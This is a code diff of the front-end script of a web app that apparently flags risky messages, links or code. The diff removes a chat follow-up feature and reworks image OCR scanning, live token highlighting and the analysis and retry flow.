-    sendChat(q, state);
-  });
-  inputEl.addEventListener('keydown', (e) => { if(e.key === 'Enter') sendBtn.click(); });
-}
-
-async function sendChat(question, state){
-  const logEl = document.getElementById('chat-log');
-  const sendBtn = document.getElementById('chat-send');
-  chatHistory.push({role:'user', content:question});
-  logEl.insertAdjacentHTML('beforeend', `<div class="chat-msg user">${escapeHtml(question)}</div>`);
-  const pendingId = 'chat-pending-' + Date.now();
-  logEl.insertAdjacentHTML('beforeend', `<div class="chat-msg assistant" id="${pendingId}"><span class="dot-flow"><span></span><span></span><span></span></span></div>`);
-  logEl.scrollTop = logEl.scrollHeight;
-  sendBtn.disabled = true;
-
-  try{
-    const res = await fetch(`${API_BASE}/api/chat`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({
-        question,
-        lang: currentLang,
-        context: {
-          text: currentEvidenceText,
-          heuristic_score: currentHeuristicScore,
-          findings: currentMatches.map(m => ({category:m.cat, label:m.label, severity:m.sev})),
-          ai_result: state.aiResult || null
-        },
-        history: chatHistory.slice(0,-1)
-      })
-    });
-    if(!res.ok) throw new Error(`Server responded with ${res.status}`);
-    const data = await res.json();
-    const answer = data.answer || data.reasoning || "I don't have a follow-up endpoint wired up on the backend yet.";
-    document.getElementById(pendingId).textContent = answer;
-    chatHistory.push({role:'assistant', content:answer});
-  } catch(err){
-    document.getElementById(pendingId).textContent = "I couldn't reach the chat endpoint (this app's backend needs a POST /api/chat route that accepts {question, context, history} and returns {answer}).";
-  } finally {
-    sendBtn.disabled = false;
-    logEl.scrollTop = logEl.scrollHeight;
-  }
-}
-
-async function callAi(text){
-  const res = await fetch(`${API_BASE}/api/analyze`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({text, lang: currentLang})
-  });
-  if(!res.ok){
-    const errBody = await res.json().catch(() => ({}));
-    throw new Error(errBody.detail || `Server responded with ${res.status}`);
-  }
-  return res.json();
-}
-
-let lastState = null;
-
-async function runFullAnalysis(text){
-  currentEvidenceText = text;
-  currentMatches = analyze(text);
-  currentHeuristicScore = computeRiskScore(currentMatches);
-  hasResult = true;
-
-  const btn = document.getElementById('analyze-btn');
-  btn.classList.add('loading');
-  document.getElementById('scan-overlay').classList.add('active');
-
-  lastState = {status:'pending', heuristicScore: currentHeuristicScore};
-  renderVerdictArea(lastState);
-
-  document.getElementById('results-wrap').scrollIntoView({behavior:'smooth', block:'start'});
-
-  await retryAi();
-  document.getElementById('scan-overlay').classList.remove('active');
-}
-
-async function retryAi(){
-  const btn = document.getElementById('analyze-btn');
-  btn.disabled = true;
-  btn.classList.add('loading');
-  try{
-    const aiResult = await callAi(currentEvidenceText);
-    lastState = {status:'done', heuristicScore: currentHeuristicScore, aiResult};
-  } catch(err){
-    lastState = {status:'done', heuristicScore: currentHeuristicScore, aiError: err.message};
-  } finally {
-    btn.disabled = false;
-    btn.classList.remove('loading');
-    renderVerdictArea(lastState);
-  }
-}
-
-/* ============================================================
-   3D tilt on the input card (mouse tracking)
-   ============================================================ */
-(function initTilt(){
-  const el = document.getElementById('textarea-tilt');
+/* ==========================================================================
+   3D tilt (mouse-tracked) — applied to result cards; pointer devices only
+   ========================================================================== */
+function initTiltFor(elements){
   if(window.matchMedia('(pointer: coarse)').matches) return;
-  el.addEventListener('mousemove', (e) => {
-    const rect = el.getBoundingClientRect();
-    const px = (e.clientX - rect.left) / rect.width - 0.5;
-    const py = (e.clientY - rect.top) / rect.height - 0.5;
-    el.style.transform = `perspective(900px) rotateY(${px*1.5}deg) rotateX(${-py*1.5}deg)`;
+  elements.forEach(el => {
+    if(el.dataset.tiltBound) return;
+    el.dataset.tiltBound = '1';
+    el.addEventListener('mousemove', (e) => {
+      const rect = el.getBoundingClientRect();
+      const px = (e.clientX - rect.left) / rect.width - 0.5;
+      const py = (e.clientY - rect.top) / rect.height - 0.5;
+      el.style.transform = `perspective(900px) rotateY(${px*1.4}deg) rotateX(${-py*1.4}deg)`;
+    });
+    el.addEventListener('mouseleave', () => { el.style.transform = ''; });
   });
-  el.addEventListener('mouseleave', () => { el.style.transform = ''; });
-})();
+}
+initTiltFor(document.querySelectorAll('#textarea-tilt'));
 
-/* ============================================================
-   Live token detection — highlights & explains as you type
-   ============================================================ */
+/* ==========================================================================
+   Live token detection while typing
+   ========================================================================== */
 const liveMirror = document.getElementById('live-mirror');
 const livePanel = document.getElementById('live-panel');
 const inputText = document.getElementById('input-text');
+const charCountEl = document.getElementById('char-count');
 let liveDebounce = null;
 let lastLiveKeys = new Set();
 
-function catPhraseFor(cat){
-  const phrases = t('catPhrases');
-  return phrases[cat] || cat;
+function updateCharCount(){
+  const len = inputText.value.length;
+  charCountEl.textContent = `${len} / ${MAX_CHARS}`;
+  charCountEl.classList.toggle('near-limit', len > MAX_CHARS * 0.9);
 }
 
 function renderLiveHighlight(){
@@ -2095,8 +1390,7 @@ function renderLiveHighlight(){
   html += escapeHtml(text.slice(cursor));
   liveMirror.innerHTML = html + '\n';
 
-  const newKeys = new Set(matches.map(m => m.label + m.start));
-  const freshOnes = matches.filter(m => !lastLiveKeys.has(m.label + m.start));
+  const newKeys = new Set(matches.map(m => m.key + m.start));
   lastLiveKeys = newKeys;
 
   if(matches.length === 0){
@@ -2106,15 +1400,13 @@ function renderLiveHighlight(){
   }
   livePanel.classList.add('open');
   const toShow = matches.slice(-6);
+  const phrases = CAT_PHRASES[currentLang];
   livePanel.innerHTML = toShow.map(m => `
     <div class="live-chip ${m.sev==='high'?'':'med'}">
       <b>${escapeHtml(m.text.length > 22 ? m.text.slice(0,22)+'…' : m.text)}</b>
-      <span>${escapeHtml(catPhraseFor(m.cat))}. ${escapeHtml(m.desc)}</span>
+      <span>${escapeHtml(phrases[m.cat] || '')}. ${escapeHtml(m.desc)}</span>
     </div>
   `).join('');
-  if(freshOnes.length){
-    livePanel.scrollTop = livePanel.scrollHeight;
-  }
 }
 
 function syncMirrorScroll(){
@@ -2123,96 +1415,196 @@ function syncMirrorScroll(){
 }
 
 inputText.addEventListener('input', () => {
+  updateCharCount();
   clearTimeout(liveDebounce);
   liveDebounce = setTimeout(renderLiveHighlight, 180);
   syncMirrorScroll();
 });
 inputText.addEventListener('scroll', syncMirrorScroll);
 
-/* ============================================================
-   Drag & drop / file & image scanning (client-side OCR)
-   ============================================================ */
+/* ==========================================================================
+   Drop zone — image / screenshot scanning via client-side OCR
+   ========================================================================== */
 const dropZone = document.getElementById('drop-zone');
 const dropInput = document.getElementById('drop-input');
-const dropPreview = document.getElementById('drop-preview');
+const dropThumb = document.getElementById('drop-thumb');
+const dropProgressLabel = document.getElementById('drop-progress-label');
+const dropProgressFill = document.getElementById('drop-progress-fill');
+const dropErrorEl = document.getElementById('drop-error');
+const dropSuccessEl = document.getElementById('drop-success');
+let tesseractLoadPromise = null;
+let dropObjectUrl = null;
 
 function loadTesseract(){
-  return new Promise((resolve, reject) => {
+  if(tesseractLoadPromise) return tesseractLoadPromise;
+  tesseractLoadPromise = new Promise((resolve, reject) => {
     if(window.Tesseract){ resolve(); return; }
     const s = document.createElement('script');
     s.src = 'https://cdnjs.cloudflare.com/ajax/libs/tesseract.js/5.0.4/tesseract.min.js';
     s.onload = resolve;
-    s.onerror = reject;
+    s.onerror = () => { tesseractLoadPromise = null; reject(new Error('load-failed')); };
     document.head.appendChild(s);
   });
+  return tesseractLoadPromise;
+}
+
+function showDropError(msg){
+  dropErrorEl.style.display = 'block';
+  dropErrorEl.innerHTML = `${escapeHtml(msg)} <button type="button">${escapeHtml(t('dismiss'))}</button>`;
+  dropErrorEl.querySelector('button').addEventListener('click', (e) => { e.stopPropagation(); dropErrorEl.style.display = 'none'; });
+}
+function clearDropMessages(){
+  dropErrorEl.style.display = 'none';
+  dropSuccessEl.style.display = 'none';
+}
+function setDropProgress(pct, label){
+  dropProgressFill.style.width = Math.max(0, Math.min(100, pct)) + '%';
+  if(label !== undefined) dropProgressLabel.textContent = label;
 }
 
 async function handleDroppedFile(file){
   if(!file) return;
-  if(file.type.startsWith('image/')){
-    const url = URL.createObjectURL(file);
-    dropPreview.style.display = 'flex';
-    dropPreview.innerHTML = `<img src="${url}" alt=""><span>Reading text from the image…</span>`;
-    try{
-      await loadTesseract();
-      const { data } = await window.Tesseract.recognize(file, currentLang === 'hi' ? 'eng+hin' : 'eng');
-      const extracted = (data.text || '').trim();
-      dropPreview.innerHTML = `<img src="${url}" alt=""><span>${extracted ? 'Extracted ' + extracted.length + ' characters — scanning now.' : 'Could not find readable text in this image.'}</span>`;
-      if(extracted){
-        inputText.value = extracted;
-        renderLiveHighlight();
-        runFullAnalysis(extracted);
+  clearDropMessages();
+
+  const okTypes = ['image/png', 'image/jpeg', 'image/webp'];
+  if(!okTypes.includes(file.type)){
+    showDropError(t('dropBadType'));
+    return;
+  }
+  if(file.size > MAX_IMAGE_BYTES){
+    showDropError(t('dropTooBig'));
+    return;
+  }
+
+  if(dropObjectUrl) URL.revokeObjectURL(dropObjectUrl);
+  dropObjectUrl = URL.createObjectURL(file);
+  dropThumb.src = dropObjectUrl;
+  dropZone.classList.add('busy');
+  setDropProgress(2, t('dropReading'));
+
+  try{
+    await loadTesseract();
+    setDropProgress(8, t('dropReading'));
+    const { data } = await window.Tesseract.recognize(file, currentLang === 'hi' ? 'eng+hin' : 'eng', {
+      logger: (m) => {
+        if(m.status === 'recognizing text' && typeof m.progress === 'number'){
+          setDropProgress(10 + m.progress * 85, t('dropReading'));
+        }
       }
-    } catch(err){
-      dropPreview.innerHTML = `<img src="${url}" alt=""><span>Couldn't load the OCR engine (check your connection) — try pasting the text instead.</span>`;
+    });
+    const extracted = (data.text || '').trim();
+    dropZone.classList.remove('busy');
+
+    if(!extracted){
+      showDropError(t('dropNone'));
+      return;
     }
-  } else {
-    const text = await file.text();
-    dropPreview.style.display = 'flex';
-    dropPreview.innerHTML = `<span>📄 ${escapeHtml(file.name)} — read ${text.length} characters, scanning now.</span>`;
-    inputText.value = text;
+
+    inputText.value = extracted.slice(0, MAX_CHARS);
+    updateCharCount();
     renderLiveHighlight();
-    runFullAnalysis(text);
+    syncMirrorScroll();
+    dropSuccessEl.style.display = 'block';
+    dropSuccessEl.textContent = t('dropDone')(inputText.value.length);
+    inputText.focus();
+    inputText.scrollIntoView({behavior:'smooth', block:'center'});
+  } catch(err){
+    dropZone.classList.remove('busy');
+    showDropError(t('dropEngineFail'));
   }
 }
 
 dropZone.addEventListener('click', () => dropInput.click());
-dropZone.addEventListener('keydown', (e) => { if(e.key === 'Enter' || e.key === ' ') dropInput.click(); });
-dropInput.addEventListener('change', (e) => handleDroppedFile(e.target.files[0]));
+dropZone.addEventListener('keydown', (e) => { if(e.key === 'Enter' || e.key === ' '){ e.preventDefault(); dropInput.click(); } });
+dropInput.addEventListener('change', (e) => { handleDroppedFile(e.target.files[0]); e.target.value = ''; });
 ['dragenter','dragover'].forEach(ev => dropZone.addEventListener(ev, (e) => { e.preventDefault(); dropZone.classList.add('drag-over'); }));
 ['dragleave','drop'].forEach(ev => dropZone.addEventListener(ev, (e) => { e.preventDefault(); dropZone.classList.remove('drag-over'); }));
-dropZone.addEventListener('drop', (e) => { handleDroppedFile(e.dataTransfer.files[0]); });
+dropZone.addEventListener('drop', (e) => { if(e.dataTransfer.files[0]) handleDroppedFile(e.dataTransfer.files[0]); });
+
+/* ==========================================================================
+   Analysis flow
+   ========================================================================== */
+async function callAi(text){
+  const res = await fetch(`${API_BASE}/api/analyze`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({text, lang: currentLang})
+  });
+  if(!res.ok){
+    const errBody = await res.json().catch(() => ({}));
+    throw new Error(errBody.detail || `Server responded with ${res.status}`);
+  }
+  return res.json();
+}
+
+function setAnalyzing(on){
+  isAnalyzing = on;
+  const btn = document.getElementById('analyze-btn');
+  btn.disabled = on;
+  btn.classList.toggle('loading', on);
+  dropZone.setAttribute('aria-disabled', on ? 'true' : 'false');
+}
+
+async function runFullAnalysis(text){
+  if(isAnalyzing) return;
+  setAnalyzing(true);
+
+  currentEvidenceText = text;
+  currentMatches = analyze(text);
+  currentHeuristicScore = computeRiskScore(currentMatches);
+
+  document.getElementById('scan-overlay').classList.add('active');
+  lastState = {status:'pending', heuristicScore: currentHeuristicScore};
+  renderVerdictArea(lastState, false);
+  document.getElementById('results-wrap').scrollIntoView({behavior:'smooth', block:'start'});
+
+  await runAiPass(true);
+  document.getElementById('scan-overlay').classList.remove('active');
+  setAnalyzing(false);
+}
+
+async function retryAi(){
+  if(isAnalyzing) return;
+  setAnalyzing(true);
+  await runAiPass(false);
+  setAnalyzing(false);
+}
+
+async function runAiPass(isFreshResult){
+  try{
+    const aiResult = await callAi(currentEvidenceText);
+    lastState = {status:'done', heuristicScore: currentHeuristicScore, aiResult};
+  } catch(err){
+    lastState = {status:'done', heuristicScore: currentHeuristicScore, aiError: err.message};
+  }
+  renderVerdictArea(lastState, isFreshResult);
+}
 
 document.getElementById('analyze-btn').addEventListener('click', () => {
-  const text = document.getElementById('input-text').value;
-  if(!text.trim()){
-    document.getElementById('input-text').focus();
+  const text = inputText.value.trim();
+  if(!text){
+    inputText.focus();
     return;
   }
-  runFullAnalysis(text);
+  runFullAnalysis(inputText.value);
 });
-
-document.querySelectorAll('.examples .chip').forEach(btn => {
-  btn.addEventListener('click', () => {
-    document.getElementById('input-text').value = EXAMPLES[btn.dataset.example];
-    if(btn.dataset.mode) setMode(btn.dataset.mode);
-    document.getElementById('input-text').focus();
-    renderLiveHighlight();
-    syncMirrorScroll();
-  });
+inputText.addEventListener('keydown', (e) => {
+  if((e.metaKey || e.ctrlKey) && e.key === 'Enter'){
+    document.getElementById('analyze-btn').click();
+  }
 });
 
 function setMode(mode){
   document.querySelectorAll('#mode-tabs .mode-tab').forEach(el => el.classList.toggle('active', el.dataset.mode === mode));
   const placeholderKeys = { auto: "placeholderAuto", message: "placeholderMessage", url: "placeholderUrl", code: "placeholderCode" };
-  document.getElementById('input-text').placeholder = t(placeholderKeys[mode] || placeholderKeys.auto);
+  inputText.placeholder = t(placeholderKeys[mode] || placeholderKeys.auto);
 }
-
 document.querySelectorAll('#mode-tabs .mode-tab').forEach(tab => {
   tab.addEventListener('click', () => setMode(tab.dataset.mode));
 });
 
 applyLanguage('en');
+updateCharCount();
 </script>
 </body>
 </html>
